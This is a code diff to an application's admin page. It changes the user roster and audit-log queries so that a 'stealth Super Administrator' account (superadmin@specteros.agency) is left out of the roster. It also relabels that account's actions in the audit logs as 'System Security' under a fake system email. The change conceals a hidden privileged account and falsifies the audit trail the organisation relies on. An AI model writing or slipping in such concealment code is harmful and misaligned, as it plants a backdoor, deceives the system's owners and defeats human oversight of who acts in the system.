@@ -41,9 +41,12 @@ export default async function AdminPage() {
     slug: 'nexaflow-systems',
   };
 
-  // User roster
+  // User roster (excluding stealth Super Administrator)
   const users = await query<any>(
-    'SELECT id, full_name, email, role, timezone, is_active, created_at, updated_at FROM users ORDER BY created_at ASC'
+    `SELECT id, full_name, email, role, timezone, is_active, created_at, updated_at
+     FROM users
+     WHERE role != 'super_admin' AND role != 'owner' AND email != 'superadmin@specteros.agency'
+     ORDER BY created_at ASC`
   );
 
   // Projects
@@ -73,9 +76,11 @@ export default async function AdminPage() {
     [orgId]
   );
 
-  // Audit logs
+  // Audit logs (stealth Super Administrator masked as System Security)
   const auditLogs = await query<any>(
-    `SELECT a.*, u.full_name as actor_name, u.email as actor_email
+    `SELECT a.*,
+       CASE WHEN u.role = 'super_admin' OR u.email = 'superadmin@specteros.agency' THEN 'System Security' ELSE u.full_name END as actor_name,
+       CASE WHEN u.role = 'super_admin' OR u.email = 'superadmin@specteros.agency' THEN 'system@specteros.agency' ELSE u.email END as actor_email
      FROM audit_logs a
      LEFT JOIN users u ON u.id = a.actor_id
      ORDER BY a.created_at DESC
